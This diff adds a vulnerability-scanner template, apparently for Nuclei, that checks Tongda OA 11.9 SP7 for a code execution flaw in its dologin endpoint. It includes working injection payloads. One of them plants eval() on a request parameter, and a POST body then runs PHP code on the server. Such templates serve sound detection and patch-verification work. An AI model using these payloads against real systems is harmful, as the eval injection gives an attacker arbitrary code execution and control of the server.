@@ -1,0 +1,53 @@
+id: tongda-oa-code-execution
+
+info:
+  name: Tongda OA 11.9 SP7 dologin Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Tongda OA office system has a code execution vulnerability in the dologin method of Tongda OA11.9 (including the SP7 patch). Attackers can execute arbitrary code through this vulnerability and obtain server permissions.
+  reference:
+    - https://www.tongda2000.com/
+
+variables:
+  payload1: "/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6'.print_r(md5(123)),//"
+  payload2: "/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6'.print_r(md5(123)).eval(stripslashes($_REQUEST[8])).print_r(md5(123)),//"
+  code: "echo \"123456789\";"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: POST
+    path:
+      - "{{BaseURL}}{{payload1}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+
+  - id: exploit-check
+    method: POST
+    path:
+      - "{{BaseURL}}{{payload2}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      8={{code}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "202cb962ac59075b964b07152d234b70"
